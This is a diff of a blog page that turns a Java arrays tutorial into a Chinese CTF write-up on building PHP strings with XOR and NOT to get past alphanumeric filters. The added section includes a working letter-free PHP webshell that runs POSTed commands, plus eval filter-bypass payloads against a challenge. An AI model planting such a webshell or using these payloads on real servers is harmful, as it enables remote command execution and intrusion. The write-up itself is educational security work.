@@ -15,20 +15,25 @@
 
 
 
-<meta name="description" content="前言 因为数组的主要内容和其它语言大致相同，所以就记一些不同的和重要的。">
-<meta name="keywords" content="学习笔记,Java">
+<meta name="description" content="前言 无论在平时的代码审计过程中还是在CTF的比赛里，都会存在将大小写字母和数字都过滤的情况，今天就来学习一下用异或来构造字符串的新姿势。">
+<meta name="keywords" content="php,小姿势">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Java学习笔记（四）--数组">
-<meta property="og:url" content="http://yoursite.com/2018/09/05/JAVA4/index.html">
+<meta property="og:title" content="异或构造字符串">
+<meta property="og:url" content="http://yoursite.com/2018/09/22/异或构造字符串/index.html">
 <meta property="og:site_name" content="Double--R blog">
-<meta property="og:description" content="前言 因为数组的主要内容和其它语言大致相同，所以就记一些不同的和重要的。">
+<meta property="og:description" content="前言 无论在平时的代码审计过程中还是在CTF的比赛里，都会存在将大小写字母和数字都过滤的情况，今天就来学习一下用异或来构造字符串的新姿势。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/15.jpg">
-<meta property="og:updated_time" content="2018-09-05T15:08:41.126Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/24.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP/4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP/5.png">
+<meta property="og:updated_time" content="2018-09-23T13:38:50.194Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Java学习笔记（四）--数组">
-<meta name="twitter:description" content="前言 因为数组的主要内容和其它语言大致相同，所以就记一些不同的和重要的。">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/15.jpg">
+<meta name="twitter:title" content="异或构造字符串">
+<meta name="twitter:description" content="前言 无论在平时的代码审计过程中还是在CTF的比赛里，都会存在将大小写字母和数字都过滤的情况，今天就来学习一下用异或来构造字符串的新姿势。">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/24.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -60,7 +65,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Java学习笔记（四）--数组 | Double--R blog</title>
+<title>异或构造字符串 | Double--R blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -306,11 +311,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-JAVA4" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-异或构造字符串" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/09/05/JAVA4/" class="article-date">
-      <time datetime="2018-09-05T01:21:19.000Z" itemprop="datePublished">2018-09-05</time>
+      <a href="/2018/09/22/异或构造字符串/" class="article-date">
+      <time datetime="2018-09-22T09:19:57.000Z" itemprop="datePublished">2018-09-22</time>
 </a>
 
 
@@ -325,7 +330,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Java学习笔记（四）--数组
+      异或构造字符串
     </h1>
   
 
@@ -334,7 +339,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-keyboard-o"></i>
 			<span class="post-meta-item-text"> 字数统计: </span>
-			<span class="post-count">1,142字</span>
+			<span class="post-count">1,379字</span>
 		</span>
 	</span>
 	
@@ -356,7 +361,7 @@
 
         
     <div class="article-tag tagcloud" style="margin-top:30px;">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/学习笔记/">学习笔记</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/">php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/小姿势/">小姿势</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -367,58 +372,65 @@
       
           
         <p><strong>前言</strong></p>
-<p>因为数组的主要内容和其它语言大致相同，所以就记一些不同的和重要的。</p>
+<p>无论在平时的代码审计过程中还是在CTF的比赛里，都会存在将大小写字母和数字都过滤的情况，今天就来学习一下用异或来构造字符串的新姿势。</p>
 <hr>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/15.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/24.jpg" alt=""></p>
 <a id="more"></a>
 <hr>
-<h2 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h2><p>数组作为对象允许使用new关键字进行内存分配，在使用数组前，必须首先定义数组变量的类型并分配内存空间</p>
-<p><strong>先声明再分配内存：</strong></p>
-<p>声明方式：</p>
-<p><code>数组元素类型 数组名字[];</code></p>
-<p><code>数组元素类型[] 数组名字;</code></p>
-<p>分配空间：</p>
-<p><code>数组名字 = new 数组元素类型[数组元素的个数];</code></p>
-<p>示例：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[];</span><br><span class="line">arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">5</span>];</span><br></pre></td></tr></table></figure>
-<p><strong>声明的同时为数组分配内存：</strong></p>
-<p><code>数组元素类型 数组名 = new 数组元素类型[数组元素的个数]</code></p>
-<h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><p><strong>先声明再分配内存：</strong></p>
-<p><code>数组元素类型 数组名字[][];</code></p>
-<p><code>数组元素类型[][] 数组名字</code></p>
-<p>为每一维数组分配内存：<code>a = new int[2][4]</code></p>
-<p>分别为每一维数组分配内存：<code>a = new int[2][] a[0] = new int[2] a[1] = new int[3]</code></p>
-<p><strong>声明的同时为数组分配内存：</strong></p>
-<p><code>数组元素类型 数组名 = new 数组元素类型[第一维个数][第二维个数]</code></p>
-<h2 id="数组的基本操作"><a href="#数组的基本操作" class="headerlink" title="数组的基本操作"></a>数组的基本操作</h2><p><strong>遍历数组：</strong></p>
-<p>遍历二维数组的常用方法是使用双层for循环，通过数组的length属性可获取数组的长度，而使用foreach语句可能会更加简单，示例代码如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tautog</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> arr2[][] = &#123;&#123;<span class="number">4</span>,<span class="number">3</span>&#125;,&#123;<span class="number">2</span>,<span class="number">1</span>&#125;&#125;;</span><br><span class="line">        System.out.println(<span class="string">"二维数组中的元素："</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> x[]:arr2)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> e:x)&#123;</span><br><span class="line">                System.out.println(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><strong>填充替换数组元素：</strong></p>
-<p>数组中的元素定义完成后，可以通过Arrays类的静态方法fill()来对数组中的元素进行替换。fill()方法有两种参数类型：</p>
-<p><code>fill(int[] a, int value)</code>，实例代码如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Swap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> arr[] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">5</span>];</span><br><span class="line">        Arrays.fill(arr,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">"第"</span>+i+<span class="string">"个元素是："</span>+arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><code>fill(int[] a,int fromIndex,int toIndex, int value)</code>，将指定的int值分配给指定范围中的每个元素，实例代码如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Swap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> arr[] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">5</span>];</span><br><span class="line">        Arrays.fill(arr,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">"第"</span>+i+<span class="string">"个元素是："</span>+arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>如果指定的索引位置大于或等于要进行填充的数组的长度，则会爆出ArrayIndexOutOfBoundsException（数组越界异常）</p>
-<p><strong>对数组进行排序：</strong></p>
-<p>通过Arrays类的静态sort()方法可以是想对数组的排序，语法如下：<code>Arrays.sort(object)</code></p>
-<p>Java中的String类型数组的排序算法是根据字典编排顺序排序的，因此数字排在字母前，大写字母排在小写字母前</p>
-<p><strong>复制数组：</strong></p>
-<p>Arrays类的copyOf()方法与copyOfRange()方法可以实现对数组的复制。copyOf()方法是复制数组至指定长度。copyOfRange()方法则将指定数组的指定长度复制到一个新数组中。</p>
-<p><code>copyOf(arr,int newlength)</code>，newlength指复制后的新数组的长度。如果新数组的长度大于数组arr的长度，则根据复制数组的类型来决定填充的值，整形数组用0，char型数组用null；如果复制后的数组长度小于数组arr的长度，则会从数组arr的第一个元素开始截取至满足新数组长度为止。</p>
-<p><code>copyOfRange(arr,int fromIndex,int toIndex)</code>新数组不包括索引是toIndex的元素。</p>
-<p><strong>数组查询：</strong></p>
-<p>Arrays类的binarySearch()方法，可使用二分法搜索指定数组，以获取指定对象。该方法返回要搜索元素的索引值。语法如下：</p>
-<p><code>binaryString(Object[] a,Object key)</code></p>
-<p><code>binaryString(Object[] a,int fromIndex,int toIndex,Object key)</code></p>
-<p>在进行此调用前要对数组进行排序（通过sort()方法）。如果没有对数组进行排序，则结果是不确定的。如果数组包含多个带有指定值的元素，则无法保证找到的是哪一个。</p>
-<p>如果key包含在数组中，则返回搜索值的索引；否则返回-1或-(第一个大于此键的元素索引)，如果数组中所有元素都小于指定的键，则返回-(a.length)。</p>
-<p>实例代码如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Reference</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ia[] = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        Arrays.sort(ia);</span><br><span class="line">        <span class="keyword">int</span> index = Arrays.binarySearch(ia,<span class="number">0</span>,<span class="number">3</span>,<span class="number">3</span>);</span><br><span class="line">        System.out.println(index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>首先来了解一下异或的概念，我们先看这一段代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"A"</span>^<span class="string">"?"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP/1.png" alt=""></p>
+<p>输出的结果是”~”，为什么会这样。首先我们知道”^”是按位异或运算符，异或的运算规则是相同为0，相异为1。而在PHP中，当两个变量进行异或时，会先将字符串转换成ASCII值，再将ASCII码值转换为二进制然后按位异或，异或后的二进制转换为ASCII码值再转换为字符，得出最后的异或结果。比如上面的例子：</p>
+<ul>
+<li>A的ASCII码值是65，对应的二进制值是01000001</li>
+<li>?的ASCII码值是63，对应的二进制值是00111111</li>
+</ul>
+<p>异或的结果是01111110，对应的ASCII码值是126，对应字符也就是”~”。</p>
+<p>除此之外，我们都知道PHP是弱类型的语言，也就是说在PHP中我们可一不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于PHP弱类型的这一特性，我们可以对PHP的变量类型进行隐式的转换，并利用这一点进行非常规操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数处理。下面我们来看一段简单的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">B</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"\nHello World"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$_++;</span><br><span class="line">	<span class="keyword">echo</span> $_;</span><br><span class="line">	$__=<span class="string">"?"</span>^<span class="string">"&#125;"</span>;</span><br><span class="line">	$__();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP/2.png" alt=""></p>
+<p>分析一下：</p>
+<ul>
+<li>$_++：对变量名为下滑线的变量进行自增操作，虽然它爆出了未定义的错误，但是还是能输出它的值，因为在PHP中未定义的变量默认值为null，null==false==0，所以我们可以在不使用任何数字的情况下通过自加得到一个数字</li>
+<li>$__=”?”^”}”：通过对字符”?”和”}”的异或运算得到结果B，并赋值给变量名为”__“的变量</li>
+<li>$__()：通过之前的赋值语句，变量”$__“的值为B，所以这一行可以看做B()，这样我们就调用了B函数</li>
+</ul>
+<p>我们来看一个由非数字字母写成的PHP后门：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++; <span class="comment">// $_ = 1</span></span><br><span class="line">    $__=(<span class="string">"#"</span>^<span class="string">"|"</span>); <span class="comment">// $__ = _</span></span><br><span class="line">    $__.=(<span class="string">"."</span>^<span class="string">"~"</span>); <span class="comment">// _P</span></span><br><span class="line">    $__.=(<span class="string">"/"</span>^<span class="string">"`"</span>); <span class="comment">// _PO</span></span><br><span class="line">    $__.=(<span class="string">"|"</span>^<span class="string">"/"</span>); <span class="comment">// _POS</span></span><br><span class="line">    $__.=(<span class="string">"&#123;"</span>^<span class="string">"/"</span>); <span class="comment">// _POST </span></span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); <span class="comment">// $_POST[0]($_POST[1]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其中.=是字符串连接，实际上我们还可一将上面的代码合并的更短</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++; <span class="comment">// $_ = 1</span></span><br><span class="line"> 	$__=(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"."</span>^<span class="string">"~"</span>).(<span class="string">"/"</span>^<span class="string">"`"</span>).(<span class="string">"|"</span>^<span class="string">"/"</span>).(<span class="string">"&#123;"</span>^<span class="string">"/"</span>);<span class="comment">// _POST </span></span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); <span class="comment">// $_POST[0]($_POST[1]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样我们通过post0和1的值就可以执行命令。</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>我们来看一下这一个题：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>它的过滤很清晰，首先传入的code参数的值的长度不能超过40，其次它过滤了所有的大小写字母和数字，左后它会用eval函数将传入的值作为PHP代码执行。最后给了提示通过调用执行getFlag()函数可以获得flag。那么我们现在有两个思路，一个是我们通过异或构造一个新的$_GET[]来获取参数，一种是异或直接构造getFlag()。</p>
+<p><strong>异或构造_GET获取参数：</strong></p>
+<p>首先我们来看一下哪些字符的异或能获得GET字符：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&#123;"</span>^<span class="string">"&lt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&#123;"</span>^<span class="string">"&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&#123;"</span>^<span class="string">"/"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP/3.png" alt=""></p>
+<p>可以看到这些字符的异或可以构造GET，但是把它拼接起来太长了，由于code参数的值的长度有限制，这样我们后面的语句构造限制就很大了，所以我们对这些做一次压缩：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>;<span class="comment">//_GET</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样的语句同样能获得”_GET”字符串。接下来就是接收参数，然后调用getFlag函数了，我们看一下最后的payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();&amp;_=getFlag</span><br></pre></td></tr></table></figure>
+<p>我们来分析一下，首先我们赋值变量_为_GET，然后我们调用变量_，也就是”${$_}[]()”这一部分，它就等于$_GET[_]()，那么我们在后接一个GET传一个参数_为getFlag，最后它就等于getFlag()，这样我们就能获得Flag</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP/4.png" alt=""></p>
+<p><strong>取反构造getFlag：</strong></p>
+<p>既然我们可以通过异或构造字符，同样的我们也能通过取反构造字符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g:103 01100111 10011000 152 \x98</span><br><span class="line">e:101 01100101 10011010 154 \x9a</span><br><span class="line">t:116 01110100 10001011 139 \x8b</span><br><span class="line">F:70  01000110 10111001 185 \xb9</span><br><span class="line">l:108 01101100 10010011 147 \x93</span><br><span class="line">a:97  01100001 10011110 158 \x9e</span><br><span class="line">g:103 01100111 10011000 152 \x98</span><br></pre></td></tr></table></figure>
+<p>将getFlag的ASCII码值转换为二进制再按位取反，得到新的二进制值，转换为ASCII码值，由于这些码值都大于128，属于ASCII扩展字符，我们很难通过键盘打出，所以我们直接输入它的URL编码以后的值，这样我们就形成payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=~%98%9A%8B%B9%93%9E%98;$_();</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP/5.png" alt=""></p>
+<p><strong>异或构造getFlag：</strong><br>原理和异或构造_GET是一样的，我这里直接贴一下payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$&#123;&quot;!&quot;^&quot;~&quot;&#125;=&quot;]%];,&lt;&lt;&quot;^&quot;:@)&#125;@][&quot;;$&#123;&quot;!&quot;^&quot;~&quot;&#125;()</span><br></pre></td></tr></table></figure>
 <hr>
-<div align="center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=28643203&auto=1&height=66"></iframe></div>
-
-
+<p><strong>参考链接：</strong></p>
+<p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a></p>
+<hr>
+<div align="center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=409931826&auto=1&height=66"></iframe></div>
       
     </div>
     
@@ -426,13 +438,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/09/05/JAVA4/">Java学习笔记（四）--数组</a></p>
+        <p><span>本文标题:</span><a href="/2018/09/22/异或构造字符串/">异或构造字符串</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Double--R</a></p>
-        <p><span>发布时间:</span>2018-09-05, 09:21:19</p>
-        <p><span>最后更新:</span>2018-09-05, 23:08:41</p>
+        <p><span>发布时间:</span>2018-09-22, 17:19:57</p>
+        <p><span>最后更新:</span>2018-09-23, 21:38:50</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/09/05/JAVA4/" title="Java学习笔记（四）--数组">http://yoursite.com/2018/09/05/JAVA4/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/09/05/JAVA4/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/09/22/异或构造字符串/" title="异或构造字符串">http://yoursite.com/2018/09/22/异或构造字符串/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/09/22/异或构造字符串/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -444,16 +456,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/09/06/JAVA5/">
-                    Java学习笔记（五）--类和对象
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/09/04/PHP-Phar/">
-                    phar扩展在PHP反序列化中的利用
+                <a href="/2018/09/16/PHP-Audit-Labs-Day2/">
+                    PHP代码审计-filter_var函数缺陷
                 </a>
             </div>
         
@@ -465,7 +471,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一维数组"><span class="toc-number">1.</span> <span class="toc-text">一维数组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二维数组"><span class="toc-number">2.</span> <span class="toc-text">二维数组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数组的基本操作"><span class="toc-number">3.</span> <span class="toc-text">数组的基本操作</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#异或"><span class="toc-number">1.</span> <span class="toc-text">异或</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">2.</span> <span class="toc-text">题目分析</span></a></li></ol>
         
     </div>
     <style>
@@ -501,7 +507,7 @@
         </div>
         <script>
             window._bd_share_config={
